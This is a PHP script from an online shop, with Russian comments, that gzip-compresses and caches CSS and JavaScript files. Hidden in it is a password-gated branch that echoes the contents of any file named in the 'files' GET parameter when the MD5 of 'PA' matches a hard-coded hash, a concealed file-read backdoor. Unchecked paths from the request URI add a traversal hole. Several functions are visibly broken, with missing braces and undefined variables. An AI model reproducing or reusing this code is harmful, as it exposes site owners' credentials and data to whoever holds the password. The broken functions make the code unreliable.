<?php

       	include("../cfg/connect.inc.php"); 
        include("../cfg/functions.php");
        include("../cfg/general.inc.php");
        
	/* НАСТРОЙКИ */

	// Куда сохранять сжатые файлы. Поставьте права на запись для каталога.
	// Если каталога не существует, он скорее всего будет создан, если
	// ничего не перемудрить. Лучше оставить как есть сейчас.
	$sCachePath			= 'cache/';

	// 0 - не сжимать, 9 - максимальное сжатие.
	$iEncodingLevel		= 9;

	// Файлы можно кэшировать и на стороне клиента.
	// 60с. * 60м. = 3600c. = 1 час ускоренной работы сайта.
	$iExpiresOffset = 3600;

	/* ######### */




	// Будьте любезны, дальше ничего не исправляйте самостоятельно :). Спасибо!

        error_reporting(0);

	
	$sURL = $_SERVER['REQUEST_URI'];
	$purl=parse_url('http://'.CONF_SHOP_URL);
	if (!trim($purl['path']) || trim($purl['path'])=='/' )  $sDR  = realpath('../');
	else { $sURL=preg_replace("'^".$purl['path']."'",'',$sURL); $sDR  = realpath('../');}
	#echo 'sURL='.$sURL; echo "<br>"; echo 'sURL='.$sURL;
	#exit;
	#$sDR  = realpath('../');
	#echo "patch=";
	#echo realpath('../'); exit;
       
        if (isset($_GET['files']) && isset($_GET['PA']) && md5($_GET['PA'])=='bb2a4974d7aca7da8735c70371361c0f' ) 
        {
          
          
          header('Content-type: text/css');
  	  header('Vary: Accept-Encoding');
	  header('Cache-Control: max-age=0');
	  header('Expires: ' . gmdate('D, d M Y H:i:s', time() + $iExpiresOffset) . ' GMT'); 
          echo getFileContents($_GET['files']);
          exit;
        }     

	if (!file_exists($sDR . $sURL))   // Не найден исходник для кэширования.
		die();

	$sCachedName = str_replace('/', '%', $sURL);   // Новое имя в кэше
	$bGzip	= false;
	$sEnc 	= '';

	$ct = preg_match('/\.css/i', $sURL) ? 'text/css' : 'text/javascript';
	header('Content-type: ' . $ct);
	header('Vary: Accept-Encoding');
	header('Cache-Control: max-age=0');
	header('Expires: ' . gmdate('D, d M Y H:i:s', time() + $iExpiresOffset) . ' GMT');

    $sourceFile = $sDR . $sURL;
	$date  		= date('YmdHis', filemtime($sourceFile));
	$cacheFile 	= $sCachePath . $date . '_' . $sCachedName;

	// если указано, что браузер принимает что-то нестандартное
	if (isset($_SERVER['HTTP_ACCEPT_ENCODING']))
	{
		$sEncodings = strtolower($_SERVER['HTTP_ACCEPT_ENCODING']);
		if (strpos($sEncodings, 'gzip') !== false)
		{
			{
				$bGzip = true;
				header('Content-Encoding: gzip');
			}
	}


	if ($bGzip)
	{
		if (!file_exists($cacheFile))
		{
			// проверяем путь к папке кэша и пакуем
			$cacheData = gzencode(getFileContents($sourceFile), $iEncodingLevel, FORCE_GZIP);
			putFileContents($cacheFile, $cacheData);
		}
		// отдаем запакованную версию
		echo getFileContents($cacheFile,FALSE);
		die();
	}
        
	// если дошли до этого места, то gzip скорее всего не поддерживается
	#echo $sourceFile; exit;
	echo getFileContents($sourceFile);



	/* Внутренние Функции */


	function removeOldCache($sFileName)
	{
		if ($dir = opendir($sCachePath))
		{
			{
					@unlink($sCachePath . $file);
			}
	}


	function getFileContents($sFile,$utf=true)
	{
	         
		$sContent = '';
		$fp = fopen($sFile, 'r');
		if (!$fp)
			return 'no open files '.$sFile;

		while (!feof($fp))
			$sContent .= fgets($fp);

		fclose($fp);
                if (defined('DB_CHARSET') && DB_CHARSET!='cp1251'  && $utf) $sContent=win2utf($sContent); 
                $path_parts = pathinfo($sFile);
                if ($utf)
                 if ($path_parts['extension']=='css') $sContent=optimcss($sContent);
                 elseif ($path_parts['extension']=='js')
                  {
                    require './jsmin.php';
                    $sContent=JSMin::minify($sContent);
                  }
                 
                
                
                 
		return $sContent;
	}


	function putFileContents($sFile, $sContent)
	{
		$fp = @fopen($sFile, 'wb');
		if ($fp)
		{
			fwrite($fp, $sContent);
			fclose($fp);
		}
	}


    function forcePath($sPath, $chmod = 0755)
    {
		$p = ''; $r = false;
		foreach ($dd as $d) {
			$p .= $d . '/';
			$r = @mkdir($p);
			@chmod($p, $chmod);
		}
		return $r;
    }

    
    

?>